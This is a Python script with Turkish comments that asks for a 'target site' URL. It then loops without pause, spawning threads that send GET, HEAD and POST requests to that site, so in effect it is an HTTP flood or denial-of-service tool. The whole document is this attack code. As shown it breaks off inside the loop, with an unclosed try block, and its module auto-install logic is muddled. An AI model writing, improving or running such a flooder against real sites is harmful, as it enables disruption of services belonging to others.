import subprocess
import requests
import threading
import time

# Kullanıcı tarafından belirlenen URL
url = input("Lütfen hedef site URL'sini girin: ")

# Diğer değişkenler
zaman_araligi_saat = .1  # İstek aralığı (saat cinsinden)
istek_sayisi = 0  # Toplam gönderilen istek sayısı

# Gerekli modülleri otomatik olarak indirme fonksiyonu
def install_module(module):
    subprocess.check_call(['pip', 'install', module])

# Kullanılacak modülleri kontrol et ve eksik olanları indir
try:
    import requests
    import threading
    import time
except ImportError as e:
    print(f"{e.name} modülü bulunamadı. İndiriliyor...")
    install_module(e.name)
    print("Modül başarıyla indirildi. Programı yeniden başlatın.")

def send_get_request():
    global istek_sayisi
    try:
        start_time = time.time()
        response = requests.get(url)
        elapsed_time = time.time() - start_time

        istek_sayisi += 1
        status_code = response.status_code
        print(f"GET - Istek Sayısı: {istek_sayisi} - - Status Code: {status_code} - - Server Ping: {elapsed_time:.4f}s - - Server Url: {url}")

    except Exception as e:
        print(f"Hata oluştu (GET): {e}")

def send_head_request():
    global istek_sayisi
    try:
        start_time = time.time()
        response = requests.head(url)
        elapsed_time = time.time() - start_time

        istek_sayisi += 1
        status_code = response.status_code
        print(f"HEAD - Istek Sayısı: {istek_sayisi} - - Status Code: {status_code} - - Server Ping: {elapsed_time:.4f}s - - Server Url: {url}")

    except Exception as e:
        print(f"Hata oluştu (HEAD): {e}")

def send_post_request():
    global istek_sayisi
    try:
        start_time = time.time()
        response = requests.post(url, data={'key': 'value'})
        elapsed_time = time.time() - start_time

        istek_sayisi += 1
        status_code = response.status_code
        print(f"POST - Istek Sayısı: {istek_sayisi} - - Status Code: {status_code} - - Server Ping: {elapsed_time:.4f}s - - Server Url: {url}")

    except Exception as e:
        print(f"Hata oluştu (POST): {e}")

while True:
    try:
        # Yavaş istekleri hızlı yolla
        threading.Thread(target=send_get_request).start()
        threading.Thread(target=send_head_request).start()
        threading.Thread(target=send_post_request).start()

        # Anlık ping durumu görmek için bekleme süresi
        pass
